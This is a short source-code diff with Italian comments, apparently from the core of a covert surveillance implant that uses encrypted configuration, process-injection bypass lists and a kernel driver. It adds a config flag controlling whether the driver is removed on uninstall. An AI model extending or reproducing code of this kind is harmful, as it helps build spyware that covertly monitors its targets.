@@ -53,8 +53,9 @@ BYTE crypt_key_conf[KEY_LEN];   // Chiave di cifratura per la conf
 aes_context crypt_ctx;		// Context per la cifratura
 aes_context crypt_ctx_conf; // Context per la cifratura per la conf
 
+BOOL g_remove_driver;	// Indica se rimuovere o meno il driver sulla disinstallazione
 DWORD log_free_space;   // Spazio a disposizione per i log
-DWORD log_active_queue;  // Quale coda e' attiva 1 o 0
+DWORD log_active_queue; // Quale coda e' attiva 1 o 0
 DWORD process_bypassed; //Numero di processi da bypassare
 char process_bypass_list[MAX_DYNAMIC_BYPASS+EMBEDDED_BYPASS][MAX_PBYPASS_LEN]; // Lista dei processi su cui non fare injection
 // Nomi dei file di sistema.
@@ -123,6 +124,8 @@ nanosec_time date_delta; // Usato per eventuali aggiustamenti sulla lettura dell
 
 // Usata per lockare il file di conf
 HANDLE conf_file_handle = NULL;
+
+extern BOOL WINAPI DA_Uninstall(BYTE *dummy_param);
 
 typedef DWORD PROCESSINFOCLASS;
 typedef struct _SYSTEM_HANDLE_INFORMATION {
@@ -2215,6 +2218,12 @@ void WINAPI ParseBypassCallback(JSONObject conf_json, DWORD dummy)
 		_snprintf_s(process_bypass_list[index+EMBEDDED_BYPASS], MAX_PBYPASS_LEN, _TRUNCATE, "%S", bypass_array[index]->AsString().c_str());
 }
 
+void WINAPI ParseDriverHandling(JSONObject conf_json, DWORD dummy)
+{
+	g_remove_driver = (BOOL) conf_json[L"remove_driver"]->AsBool();
+}
+
+
 // Legge le configurazioni globali
 void HM_UpdateGlobalConf()
 {
@@ -2262,10 +2271,12 @@ void HM_UpdateGlobalConf()
 	// Legge il delta date dal file di stato...
 	Log_RestoreAgentState(PM_CORE, (BYTE *)&date_delta, sizeof(date_delta)); 
 
-	// Legge la lista dei processi da bypassare 
+	// Legge la lista dei processi da bypassare e la gestione del driver
 	conf_memory = HM_ReadClearConf(H4_CONF_FILE);
-	if (conf_memory)
+	if (conf_memory) {
 		HM_ParseConfGlobals(conf_memory, &ParseBypassCallback);
+		HM_ParseConfGlobals(conf_memory, &ParseDriverHandling);
+	}
 	SAFE_FREE(conf_memory);
 }
 
